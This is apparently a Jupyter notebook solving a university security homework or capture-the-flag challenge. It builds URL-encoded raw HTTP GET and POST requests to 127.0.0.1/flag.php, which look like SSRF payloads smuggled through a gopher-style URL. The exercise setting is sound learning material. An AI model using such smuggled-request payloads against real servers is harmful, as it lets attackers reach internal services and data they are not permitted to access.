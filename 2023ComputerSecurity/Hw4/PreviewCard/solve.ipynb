{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "import urllib\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'_GET%20/flag.php%20HTTP/1.1%0D%0AHost%3A%20127.0.0.1%0D%0A'"
      ]
     },
     "execution_count": 2,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "test = \"\"\"GET /flag.php HTTP/1.1\n",
    "Host: 127.0.0.1\n",
    "\"\"\"\n",
    "\n",
    "payload = \"_\" + urllib.parse.quote(test).replace(\"%0A\", \"%0D%0A\")\n",
    "payload"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'_POST%20/flag.php%20HTTP/1.1%0D%0AHost%3A%20127.0.0.1%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AContent-Length%3A%2014%0D%0A%0D%0Agivemeflag%3Dyes%0D%0A'"
      ]
     },
     "execution_count": 5,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "test = \"\"\"POST /flag.php HTTP/1.1\n",
    "Host: 127.0.0.1\n",
    "Content-Type: application/x-www-form-urlencoded\n",
    "Content-Length: 14\n",
    "\n",
    "givemeflag=yes\n",
    "\"\"\"\n",
    "\n",
    "payload = \"_\" + urllib.parse.quote(test).replace(\"%0A\", \"%0D%0A\")\n",
    "payload"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.12"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
